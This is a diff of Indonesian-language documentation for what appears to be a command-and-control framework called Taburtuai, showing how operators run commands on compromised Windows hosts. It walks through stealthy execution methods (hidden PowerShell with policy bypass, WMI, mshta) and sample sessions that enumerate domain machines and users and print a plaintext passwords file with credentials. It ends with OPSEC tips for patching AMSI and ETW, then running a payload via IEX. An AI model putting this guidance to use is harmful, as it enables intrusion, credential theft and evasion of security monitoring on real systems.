@@ -2,258 +2,394 @@
 
 ## Metode Eksekusi
 
-Taburtuai mendukung empat cara eksekusi shell command di target Windows. Metode ini
-di-bake ke agent saat build dan bisa dioverride per-command.
+Taburtuai mendukung empat metode eksekusi di Windows. Pilih berdasarkan situasi:
 
-| Method | Binary yang Dipanggil | LOLBin | Cocok untuk |
-|---|---|---|---|
-| `cmd` | `cmd.exe /C` | Tidak | Default, kompatibel luas |
-| `powershell` | `powershell.exe -EncodedCommand` | Tidak | Output rich, cmdlets PowerShell |
-| `wmi` | `wmic.exe process call create` | Ya | Parent proses = svchost.exe |
-| `mshta` | `mshta.exe javascript:...` | Ya | Bypass monitoring cmd/ps |
+| Method | Command | Deteksi | Gunakan Ketika |
+|--------|---------|---------|----------------|
+| `powershell` | `powershell.exe -w hidden -ep bypass -c "..."` | Sedang | Default, cmdlet PS dibutuhkan |
+| `cmd` | `cmd.exe /c "..."` | Rendah | Perintah CMD sederhana, lebih stealth |
+| `wmi` | `WMI Win32_Process::Create` | Rendah | Eksekusi lateral/remote |
+| `mshta` | `mshta vbscript:...` | Rendah | Living-off-the-land, LOLBin |
+
+**Default:** Agent menggunakan method yang di-bake saat build (`EXEC_METHOD`).
+Bisa di-override per-command dengan flag `--method`.
 
 ---
 
-## Single Command — `cmd`
+## Eksekusi Satu Perintah
 
-### Syntax
+### Syntax Dasar
 
 ```
 cmd <agent-id> "<perintah>"
 ```
 
-### Contoh Dasar
+### Contoh: Identifikasi Awal
 
 ```
-taburtuai(IP:PORT) › cmd 2703886d "whoami"
-[+] DESKTOP-QLPBF95\windows
+taburtuai(IP:8000) › cmd 2703886d "whoami"
+```
+```
+[*] Queuing command (method: powershell)...
+[+] Command queued: a1b2c3d4-5e6f-7890-abcd-ef1234567890
+[*] Waiting for result (timeout: 30s)...
+[+] Result received (1.3s, exit_code: 0):
 
-taburtuai(IP:PORT) › cmd 2703886d "hostname"
-[+] DESKTOP-QLPBF95
+DESKTOP-QLPBF95\john.doe
+```
 
-taburtuai(IP:PORT) › cmd 2703886d "ipconfig /all"
-[+]
+```
+taburtuai(IP:8000) › cmd 2703886d "whoami /all"
+```
+```
+[+] Result received (1.1s):
+
+USER INFORMATION
+----------------
+User Name                  SID
+========================== ===========================================
+desktop-qlpbf95\john.doe   S-1-5-21-1234567890-0987654321-1122334455-1001
+
+GROUP INFORMATION
+-----------------
+Group Name                                 Type             SID
+========================================== ================ ==================
+Everyone                                   Well-known group S-1-1-0
+BUILTIN\Administrators                     Alias            S-1-5-32-544
+BUILTIN\Users                              Alias            S-1-5-32-545
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
+NT AUTHORITY\This Organization             Well-known group S-1-5-15
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+```
+
+### Contoh: Info Sistem
+
+```
+taburtuai(IP:8000) › cmd 2703886d "systeminfo"
+```
+```
+[+] Result received (3.2s):
+
+Host Name:                 DESKTOP-QLPBF95
+OS Name:                   Microsoft Windows 11 Home
+OS Version:                10.0.22621 Build 22621
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          John Doe
+Registered Organization:
+Product ID:                00326-10000-00000-AA385
+Original Install Date:     3/15/2025, 9:00:00 AM
+System Boot Time:          4/23/2026, 8:45:00 AM
+System Manufacturer:       Dell Inc.
+System Model:              XPS 13 9305
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 140 Stepping 1
+Total Physical Memory:     16,384 MB
+Available Physical Memory: 8,621 MB
+Virtual Memory: Max Size:  18,816 MB
+Domain:                    CORP.LOCAL
+Logon Server:              \\DC01
+```
+
+### Contoh: Network Enumeration
+
+```
+taburtuai(IP:8000) › cmd 2703886d "ipconfig /all"
+```
+```
+[+] Result received (0.8s):
+
 Windows IP Configuration
 
-   Host Name . . . . . . . . . : DESKTOP-QLPBF95
-   Primary Dns Suffix  . . . . :
-   ...
+   Host Name . . . . . . . . . . . . : DESKTOP-QLPBF95
+   Primary Dns Suffix  . . . . . . . : corp.local
+   Node Type . . . . . . . . . . . . : Hybrid
+   DNS Suffix Search List. . . . . . : corp.local
+
+Ethernet adapter Ethernet:
+   Connection-specific DNS Suffix  . : corp.local
+   Description . . . . . . . . . . . : Intel(R) Ethernet Connection
+   Physical Address. . . . . . . . . : 00-11-22-33-44-55
+   DHCP Enabled. . . . . . . . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.1.105(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
+   DHCP Server . . . . . . . . . . . : 192.168.1.1
+   DNS Servers . . . . . . . . . . . : 192.168.1.10
+                                       8.8.8.8
 ```
 
-### Perintah dengan Spasi dan Karakter Khusus
-
-Gunakan tanda kutip ganda untuk membungkus perintah:
-
 ```
-taburtuai(IP:PORT) › cmd 2703886d "dir C:\Users\windows\Desktop"
-taburtuai(IP:PORT) › cmd 2703886d "net user administrator"
-taburtuai(IP:PORT) › cmd 2703886d "systeminfo | findstr /i os"
-taburtuai(IP:PORT) › cmd 2703886d "wmic computersystem get username"
+taburtuai(IP:8000) › cmd 2703886d "net view /all /domain"
 ```
-
-### Dengan Timeout
-
 ```
-taburtuai(IP:PORT) › cmd 2703886d "ping -n 10 8.8.8.8" --timeout 30
-```
+[+] Result received (2.5s):
 
-### Tanpa Menunggu Hasil (`--no-wait`)
-
-```
-taburtuai(IP:PORT) › cmd 2703886d "start notepad.exe" --no-wait
-[+] Command queued: a1b2c3d4-...
-[*] Use 'status a1b2c3d4-...' to check result later.
+Server Name            Remark
+-------------------------------------------------------------------------------
+\\DC01                 Primary Domain Controller
+\\FILESERVER-01        File Server
+\\CORP-WS-042          Workstation
+\\MAIL-SERVER          Exchange Mail Server
+The command completed successfully.
 ```
 
 ---
 
-## Interactive Shell — `shell`
+## Pilih Metode Eksekusi
 
-Buka sesi shell interaktif dengan agent. Kamu bisa mengetik perintah seperti di terminal
-biasa, tanpa harus terus mengetik `cmd <id>` setiap saat.
-
-### Buka Shell
+### Override per-Command
 
 ```
-taburtuai(IP:PORT) › shell 2703886d
+taburtuai(IP:8000) › cmd 2703886d "Get-Process" --method powershell
+taburtuai(IP:8000) › cmd 2703886d "dir C:\Users" --method cmd
+taburtuai(IP:8000) › cmd 2703886d "Get-ADUser -Filter *" --method powershell
 ```
 
+### Kapan Masing-Masing Dipakai
+
+**`cmd` — CMD.exe**
 ```
-[*] Opening interactive shell with 2703886d (DESKTOP-QLPBF95\windows)
-[*] Type 'exit' or 'quit' to end session. Ctrl+C to interrupt.
-
-[shell 2703886d DESKTOP-QLPBF95\windows] >
+# Perintah file system sederhana
+taburtuai(IP:8000) › cmd 2703886d "dir C:\Users\john.doe\Desktop /b" --method cmd
+```
+```
+[+] Result (0.4s):
+loot.xlsx
+passwords.txt
+README.md
+desktop.ini
 ```
 
-### Contoh Sesi Shell
+**`powershell` — PowerShell**
+```
+# PowerShell cmdlet, .NET, WMI query
+taburtuai(IP:8000) › cmd 2703886d "Get-LocalUser | Select Name,Enabled,LastLogon" --method powershell
+```
+```
+[+] Result (1.8s):
+
+Name               Enabled LastLogon
+----               ------- ---------
+Administrator      False
+DefaultAccount     False
+Guest              False
+john.doe           True    4/23/2026 8:44:12 AM
+WDAGUtilityAccount False
+```
+
+**`wmi` — WMI Process Create**
+```
+# Eksekusi via WMI (tidak membuat cmd/ps child process langsung)
+taburtuai(IP:8000) › cmd 2703886d "ipconfig" --method wmi
+```
+
+**`mshta` — MSHTA VBScript**
+```
+# Living off the land, kurang terdeteksi di endpoint tertentu
+taburtuai(IP:8000) › cmd 2703886d "ipconfig" --method mshta
+```
+
+---
+
+## Custom Timeout
+
+Default timeout: 30 detik. Untuk perintah yang lama (scan, build, copy besar):
 
 ```
-[shell 2703886d DESKTOP-QLPBF95\windows] > whoami
-DESKTOP-QLPBF95\windows
+taburtuai(IP:8000) › cmd 2703886d "Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue" \
+  --method powershell \
+  --timeout 120 \
+  --wait
+```
 
-[shell 2703886d DESKTOP-QLPBF95\windows] > net user
-User accounts for \\DESKTOP-QLPBF95
--------------------------------------------------------------------------------
-Administrator   DefaultAccount  Guest   windows   WDAGUtilityAccount
-The command completed successfully.
+**Output:**
+```
+[*] Command queued (timeout: 120s)...
+[*] Waiting for result...
+[+] Result received (34.7s):
 
-[shell 2703886d DESKTOP-QLPBF95\windows] > net localgroup administrators
+    Directory: C:\Users\john.doe
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/20/2026   2:14 PM                .ssh
+d-----         4/23/2026   8:44 AM                AppData
+...
+[truncated — 1,247 items]
+```
+
+---
+
+## Working Directory
+
+Jalankan perintah dari direktori tertentu:
+
+```
+taburtuai(IP:8000) › cmd 2703886d "dir" --working-dir "C:\Windows\System32"
+```
+```
+[+] Result (0.6s):
+
+ Volume in drive C has no label.
+ Volume Serial Number is 1A2B-3C4D
+
+ Directory of C:\Windows\System32
+
+04/23/2026  09:00 AM    <DIR>          .
+04/23/2026  09:00 AM    <DIR>          ..
+03/14/2025  09:15 AM         9,452,016 ntdll.dll
+03/14/2025  09:15 AM         1,245,184 kernel32.dll
+...
+```
+
+---
+
+## Interactive Shell Session
+
+Untuk operasi multi-step yang butuh konteks (working dir, variabel, dll):
+
+```
+taburtuai(IP:8000) › shell 2703886d
+```
+
+**Output:**
+```
+[*] Opening interactive shell on 2703886d (DESKTOP-QLPBF95)...
+[*] Commands dijalankan satu per satu melalui antrean beacon.
+[*] Ketik 'exit' untuk menutup session.
+
+[shell 2703886d DESKTOP-QLPBF95\john.doe] >
+```
+
+### Sesi Kerja Lengkap
+
+```
+[shell 2703886d DESKTOP-QLPBF95\john.doe] > whoami /groups | findstr "admin"
+BUILTIN\Administrators                     Alias   S-1-5-32-544  Mandatory group, Enabled by default, Enabled group, Group owner
+
+[shell 2703886d DESKTOP-QLPBF95\john.doe] > net localgroup administrators
 Alias name     administrators
-Comment        Administrators have complete and unrestricted access...
 Members
--------------------------------------------------------------------------------
 Administrator
-The command completed successfully.
+john.doe
 
-[shell 2703886d DESKTOP-QLPBF95\windows] > dir C:\Users
- Volume in drive C is Windows
- Volume Serial Number is A1B2-C3D4
+[shell 2703886d DESKTOP-QLPBF95\john.doe] > dir "C:\Users\john.doe\AppData\Roaming\Microsoft\Windows\Recent"
+ Directory of C:\Users\john.doe\AppData\Roaming\Microsoft\Windows\Recent
 
- Directory of C:\Users
-04/23/2026  04:30 PM    <DIR>          .
-04/23/2026  04:30 PM    <DIR>          ..
-04/23/2026  02:15 PM    <DIR>          Administrator
-04/23/2026  02:15 PM    <DIR>          Public
-04/23/2026  02:30 PM    <DIR>          windows
+04/23/2026  07:30 AM                23 budget_2026.xlsx.lnk
+04/22/2026  06:15 PM                23 passwords.txt.lnk
+04/21/2026  03:45 PM                23 vpn_config.ovpn.lnk
 
-[shell 2703886d DESKTOP-QLPBF95\windows] > exit
-[*] Shell session ended.
-```
+[shell 2703886d DESKTOP-QLPBF95\john.doe] > type "C:\Users\john.doe\Documents\passwords.txt"
+DB_PROD: Adm1n@2026!
+VPN: john.doe:SecureVPN123
+Router: admin:router123
 
-### Opsi Shell
-
-```
-taburtuai(IP:PORT) › shell 2703886d --timeout 300
-# Timeout 5 menit per perintah (default: 60s)
+[shell 2703886d DESKTOP-QLPBF95\john.doe] > exit
+[*] Shell session closed.
 ```
 
 ---
 
-## Perintah Enumerasi Umum
+## History Perintah
 
-Berikut kumpulan perintah yang berguna untuk fase post-exploitation awal:
-
-### Identitas dan Privilege
+Lihat riwayat semua perintah ke agent tertentu:
 
 ```
-[shell] > whoami
-[shell] > whoami /all                         # privilege lengkap
-[shell] > whoami /groups                      # group membership
-[shell] > net user %username% /domain         # info user di domain
-[shell] > query user                          # siapa saja yang login
+taburtuai(IP:8000) › history 2703886d
 ```
 
-### System Information
-
+**Output:**
 ```
-[shell] > systeminfo
-[shell] > systeminfo | findstr /i "os domain"
-[shell] > wmic os get caption,version,buildnumber
-[shell] > wmic computersystem get name,domain,manufacturer,model
-[shell] > hostname
-[shell] > echo %COMPUTERNAME%
-[shell] > echo %USERDOMAIN%
-```
+[+] Command history for agent 2703886d (last 20):
 
-### Jaringan
-
-```
-[shell] > ipconfig /all
-[shell] > netstat -ano                        # koneksi aktif
-[shell] > netstat -ano | findstr ESTABLISHED  # koneksi established saja
-[shell] > arp -a                              # ARP table
-[shell] > route print                         # routing table
-[shell] > net view /all                       # lihat mesin di network
-[shell] > net view /domain                    # lihat domain
+CMD-ID          TYPE     COMMAND              STATUS     DURATION   CREATED
+a1b2c3d4        execute  whoami               completed  1.3s       09:05:01
+b2c3d4e5        execute  systeminfo           completed  3.2s       09:06:14
+c3d4e5f6        execute  ipconfig /all        completed  0.8s       09:07:32
+d4e5f6g7        execute  net view /all        completed  2.5s       09:08:55
+e5f6g7h8        execute  dir C:\Users         completed  0.6s       09:10:01
 ```
 
-### Users dan Groups
+### Filter berdasarkan Status
 
 ```
-[shell] > net user                            # local users
-[shell] > net localgroup                      # local groups
-[shell] > net localgroup administrators       # anggota admin
-[shell] > net user administrator              # detail administrator
-[shell] > wmic useraccount list brief
-```
-
-### Proses dan Service
-
-```
-[shell] > tasklist
-[shell] > tasklist /v                         # dengan detail
-[shell] > tasklist /svc                       # dengan service
-[shell] > net start                           # service yang berjalan
-[shell] > sc query                            # status semua service
-```
-
-### Installed Software
-
-```
-[shell] > wmic product get name,version
-[shell] > reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s
-```
-
-### Security Products (AV/EDR Detection)
-
-```
-[shell] > wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
-[shell] > sc query windefend                  # Windows Defender status
-[shell] > tasklist | findstr -i "defender endpoint crowdstrike sentinel cylance"
-```
-
-### File System
-
-```
-[shell] > dir C:\Users\windows\Desktop
-[shell] > dir C:\Users\windows\Documents
-[shell] > dir C:\Users\windows\Downloads
-[shell] > dir "C:\Program Files"
-[shell] > dir C:\ /s /b | findstr /i "password credential config"
-[shell] > type C:\Users\windows\Desktop\passwords.txt
+taburtuai(IP:8000) › history 2703886d --status failed
+taburtuai(IP:8000) › history 2703886d --status pending
+taburtuai(IP:8000) › history 2703886d --limit 50
 ```
 
 ---
 
-## Memahami Exit Code
-
-Setiap perintah punya exit code:
-- **0** → sukses
-- **Non-zero** → gagal / error
+## Lihat Status & Output Perintah Spesifik
 
 ```
-taburtuai(IP:PORT) › status <cmd-id>
+taburtuai(IP:8000) › result a1b2c3d4
+```
 
-    Exit Code  : 0       ← sukses
-    Exit Code  : 1       ← error umum
-    Exit Code  : -1      ← timeout / agent tidak eksekusi
+**Output:**
+```
+[+] Command a1b2c3d4-5e6f-7890-abcd-ef1234567890
+
+  Agent     : 2703886d (DESKTOP-QLPBF95)
+  Type      : execute
+  Command   : whoami
+  Status    : completed
+  Exit Code : 0
+  Created   : 09:05:01
+  Executed  : 09:05:02 (queued 1.1s)
+  Completed : 09:05:03 (ran 1.3s)
+
+  Output:
+  DESKTOP-QLPBF95\john.doe
 ```
 
 ---
 
-## Exec Method di Shell
+## Bersihkan Antrean Perintah
 
-Secara default, `shell` dan `cmd` menggunakan exec method yang di-bake saat build agent
-(biasanya `powershell` untuk stealth build). Kamu tidak perlu mengubahnya kecuali ada
-kebutuhan spesifik.
+Hapus semua perintah pending di antrean agent (berguna kalau agent offline lama):
 
-**Kapan pakai `cmd` method:**
-- Target block PowerShell via AppLocker/GPO
-- Perintah sederhana yang tidak butuh cmdlet PowerShell
-- Kompatibilitas maksimal dengan Windows lama
+```
+taburtuai(IP:8000) › queue clear 2703886d
+```
 
-**Kapan pakai `powershell` method (default):**
-- Perintah yang pakai pipeline (`|`)
-- Butuh .NET framework
-- Output rich (tabel, format, dll)
+**Output:**
+```
+[+] Cleared 3 pending commands from queue for agent 2703886d.
+```
 
-**Kapan pakai `wmi` method:**
-- Butuh proses parent = svchost.exe (lebih stealth)
-- Target ada monitoring cmd.exe dan powershell.exe
+---
 
-**Kapan pakai `mshta` method:**
-- Kedua cmd.exe dan powershell.exe diblokir
-- Butuh LOLBin execution
+## Tips OPSEC
+
+```
+# Hindari keyword yang mudah dideteksi EDR
+cmd 2703886d "Get-Process" --method powershell  ← lebih stealth
+cmd 2703886d "tasklist"                          ← cmd biasa
+
+# Untuk perintah dengan output besar, simpan dulu ke file di target
+cmd 2703886d "Get-ChildItem C:\ -Recurse > C:\Temp\enum.txt 2>&1" --timeout 300
+# Lalu download file-nya
+files download 2703886d "C:\Temp\enum.txt" ./enum.txt
+
+# Hindari PowerShell ScriptBlock logging (setelah AMSI/ETW di-patch)
+bypass amsi 2703886d --wait
+bypass etw  2703886d --wait
+# Baru jalankan script PS yang berbahaya
+cmd 2703886d "IEX (Get-Content payload.ps1)" --method powershell
+```
 
 ---
 
